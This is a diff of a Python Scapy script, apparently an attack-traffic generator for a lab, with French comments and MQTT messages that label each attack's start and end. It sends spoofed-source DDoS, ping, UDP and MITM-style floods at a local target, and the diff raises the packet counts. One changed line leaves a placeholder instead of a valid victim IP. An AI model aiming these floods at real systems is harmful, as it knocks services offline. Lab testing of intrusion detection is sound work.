@@ -11,7 +11,7 @@ def on_connect(client, userdata, flags, rc):
 
 client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
 client.on_connect = on_connect
-client.connect("192.168.1.18", 1883, 60)
+client.connect("192.168.3.109", 1883, 60)
 
 def send_attack_notification(attack_type, attack_id, is_start=True):
     message = f"{attack_type}:{attack_id}{':start' if is_start else ':end'}"
@@ -26,7 +26,7 @@ def simulate_attack(target_ip):
     send_attack_notification(attack_type, attack_id, is_start=True)
 
     if attack_type == 'ddos':
-        nombre_paquets = random.randint(100, 5000)
+        nombre_paquets = random.randint(500, 5000)
         print(nombre_paquets)
         for _ in range(nombre_paquets):
             spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
@@ -34,7 +34,7 @@ def simulate_attack(target_ip):
             send(packet, verbose=0)
 
     elif attack_type == 'ping_flood':
-        nombre_paquets = random.randint(100, 2000)
+        nombre_paquets = random.randint(400, 3000)
         print("Simulating Ping Flood")
         for _ in range(nombre_paquets):  # Augmente le nombre de pings pour simuler un flood
             packet = IP(dst=target_ip) / ICMP()
@@ -42,8 +42,8 @@ def simulate_attack(target_ip):
 
     elif attack_type == "mitm":
         random_number = random.randint(1, 253)
-        victim_ip = f"192.168.3.{random_number}"
-        nombre_paquets = random.randint(50, 500)
+        victim_ip = f"192.168.3.(met l'ip du client ACTUEL)"
+        nombre_paquets = random.randint(200, 1000)
         for _ in range(nombre_paquets):
             spoofed_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
             # Falsification des adresses IP pour imiter l'IP de la victime
@@ -56,7 +56,7 @@ def simulate_attack(target_ip):
             send(packet, verbose=0)
 
     elif attack_type == 'udp_flood':
-        nombre_paquets = random.randint(100, 2000)
+        nombre_paquets = random.randint(300, 3000)
         print("Simulating UDP Flood")
         for _ in range(nombre_paquets):
             packet = IP(dst=target_ip) / UDP(dport=random.randint(1, 65535))
@@ -65,7 +65,7 @@ def simulate_attack(target_ip):
     send_attack_notification(attack_type, attack_id, is_start=False)
 
 if __name__ == "__main__":
-    target_ip = "192.168.1.18"
+    target_ip = "192.168.3.109"
     try:
         while True:
             simulate_attack(target_ip)
